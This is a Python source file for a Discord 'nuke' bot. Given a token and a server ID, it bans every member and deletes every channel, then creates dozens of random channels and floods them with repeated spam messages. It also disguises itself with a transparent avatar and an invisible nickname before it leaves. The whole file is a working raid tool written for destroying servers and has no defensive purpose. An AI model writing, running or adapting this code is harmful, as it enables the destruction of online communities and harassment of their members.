import traceback, datetime, discord, asyncio, random, string
from discord.ext import commands

logs = {}
stops = []

intents = discord.Intents.all()
class DiscordBot(commands.Bot):
    def __init__(self, logId:str, token:str, guildId:int, channelName:str, latency:int, message:str, allUserBan:bool, allChannelDelete:bool):
        super().__init__(intents=intents, command_prefix="!", description="Yaa so good bot\n<<sound:1>>")
        self.logId = logId
        self.token = token
        self.guildId = guildId
        self.channelName = channelName
        self.nukeLatency = latency
        self.message = message
        self.allUserBan = allUserBan
        self.allChannelDelete = allChannelDelete
        
        self.channels = None
    async def banUser(self, user:discord.Member):
        try:
            await user.ban(reason="Fuck Server User")
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "-- Error --\n"
            logs[self.logId] += "[-]Failed"
        logs[self.logId] += f" | {str(datetime.datetime.now())} BanUser ID:{user.id} Name:{user.name}\n"
    async def deleteChannel(self, channel:discord.abc.GuildChannel):
        try:
            await channel.delete()
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
            logs[self.logId] += "[-]Failed"
        logs[self.logId] += f" | {str(datetime.datetime.now())} DeleteChannel ID:{channel.id} Name:{channel.name}\n"
    async def sendMessage(self, message:str, channel:discord.TextChannel, latencyMs:float):
        try:
            await channel.send(message)
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
            logs[self.logId] += "[-]Failed"
        logs[self.logId] += f" | {str(datetime.datetime.now())} SendMessage ID:{channel.id}\n"
        await asyncio.sleep(latencyMs)
    async def banAllUser(self, guild:discord.Guild):
        logs[self.logId] += "---- Start AllUserBan ----\n"
        await asyncio.gather(*(self.banUser(member) for member in guild.members))
        logs[self.logId] += "---- End ----\n\n\n"
    async def deleteAllChannel(self, guild:discord.Guild):
        logs[self.logId] += "---- Start AllChannelDelete ----\n"
        await asyncio.gather(*(self.deleteChannel(channel) for channel in guild.channels))
        logs[self.logId] += "---- End ----\n\n\n"
    async def createChannel(self, channelName:str, guild:discord.Guild):
        channelName = channelName+"-"+"".join(random.choice(string.ascii_lowercase) for _ in range(10))
        await guild.create_text_channel(channelName)
    async def nuke(self, latency:int, message:str, guild:discord.Guild, channelName:str, numberOfExecutions=50):
        logs[self.logId] += "---- Start Nuke ----\n"
        try:
            await asyncio.gather(*(self.createChannel(channelName, guild) for _ in range(55)))
            self.channels = list(guild.channels)
            for _ in range(numberOfExecutions):
                if self.logId in stops:
                    logs.pop(self.logId)
                    await self.close()
                    return
                logs[self.logId] += "--- Nuke ---\n"
                bMessage = message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(30))
                await asyncio.gather(*(self.sendMessage(bMessage, channel, latency*0.001) for channel in self.channels))
        except:
            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
        logs[self.logId] += "---- End ----\n"
        stops.append(self.logId)
        await guild.leave()
        await self.close()
    async def on_ready(self):
        logs[self.logId] += f"ID:{self.user.id}, Name:{self.user.name}\n\n"
        self.guild = self.get_guild(self.guildId)
        if not self.guild:
            logs[self.logId] += f"Error: The server you entered has not been joined by a bot."
            await self.close()
            return
        with open('../assets/transparentAvatar.png', 'rb') as avatar:
            await self.user.edit(avatar=avatar.read())
        i = self.guild.get_member(self.user.id)
        await i.edit(nick="឵᠎")
        if self.allUserBan:
            await self.banAllUser(self.guild)
        if self.allChannelDelete:
            await self.deleteAllChannel(self.guild)
        await self.nuke(self.nukeLatency, self.message, self.guild, self.channelName)
    async def on_message(self, message):
        if message.author.bot:
            return
    def runBot(self):
        try:
            self.run(self.token, reconnect=True)
        except:
            logs[self.logId] += f"Error:\n{traceback.format_exc()}"